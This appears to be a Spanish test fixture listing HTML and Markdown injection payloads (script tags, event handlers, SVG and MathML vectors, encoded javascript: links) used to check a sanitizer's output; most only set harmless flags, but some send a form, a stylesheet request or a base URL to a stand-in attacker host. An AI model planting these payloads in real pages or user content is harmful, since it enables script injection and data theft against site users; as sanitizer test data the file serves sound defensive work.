# Inyección de HTML activo

Los fragmentos de este archivo son datos de prueba. La comprobación mira cómo
quedan en el DOM después de renderizar; no se ejecuta ninguno.

## Script directo

<script>window.__XSS1 = true;</script>

<script type="text/javascript">window.__XSS2 = true;</script>

<SCRIPT>window.__XSS3 = true;</SCRIPT>

## Manejadores de eventos

<img src="x" onerror="window.__XSS4 = true">
<img src="x" ONERROR="window.__XSS5 = true">
<img src="x" onerror = "window.__XSS6 = true">
<div onclick="window.__XSS7 = true">texto</div>
<body onload="window.__XSS8 = true">
<svg onload="window.__XSS9 = true"></svg>
<input autofocus onfocus="window.__XSS10 = true">

## Marcos y objetos incrustados

<iframe src="https://example.com"></iframe>
<iframe srcdoc="&lt;script&gt;window.__XSS11 = true&lt;/script&gt;"></iframe>
<object data="https://example.com/x.swf"></object>
<embed src="https://example.com/x.swf">

## Formularios

<form action="https://atacante.example/recoger" method="post">
  <input name="dato" value="secreto">
  <button type="submit">Enviar</button>
</form>

## Estilos globales

<style>body { display: none !important; }</style>
<style>@import url("https://atacante.example/rastreo.css");</style>

## Etiqueta base

<base href="https://atacante.example/">

## SVG con contenido activo

<svg xmlns="http://www.w3.org/2000/svg">
  <script>window.__XSS12 = true;</script>
  <a href="javascript:window.__XSS13=true"><text y="20">clic</text></a>
  <foreignObject><body xmlns="http://www.w3.org/1999/xhtml">
    <img src="x" onerror="window.__XSS14 = true">
  </body></foreignObject>
</svg>

## MathML

<math>
  <maction actiontype="statusline#https://atacante.example">
    <mtext>pasar el mouse</mtext>
  </maction>
  <annotation-xml encoding="text/html">
    <img src="x" onerror="window.__XSS15 = true">
  </annotation-xml>
</math>

## Entidades, mayúsculas mezcladas y espacios

<a href="&#106;avascript:window.__XSS16=true">entidad decimal</a>
<a href="&#x6a;avascript:window.__XSS17=true">entidad hexadecimal</a>
<a href="JaVaScRiPt:window.__XSS18=true">mayúsculas mezcladas</a>
<a href="  javascript:window.__XSS19=true">espacios delante</a>
<a href="java&#9;script:window.__XSS20=true">tabulador intercalado</a>
<a href="java&#10;script:window.__XSS21=true">salto de línea intercalado</a>

## Etiqueta sin cerrar y atributo suelto

<img src=x onerror=window.__XSS22=true>
<div "><img src=x onerror="window.__XSS23=true">">
<noscript><p title="</noscript><img src=x onerror=window.__XSS24=true>">

## Comentario que intenta cerrar el contexto

<!-- --><script>window.__XSS25 = true;</script><!-- -->

## Enlace Markdown con protocolo peligroso

[enlace](javascript:window.__XSS26=true)

![imagen](javascript:window.__XSS27=true)
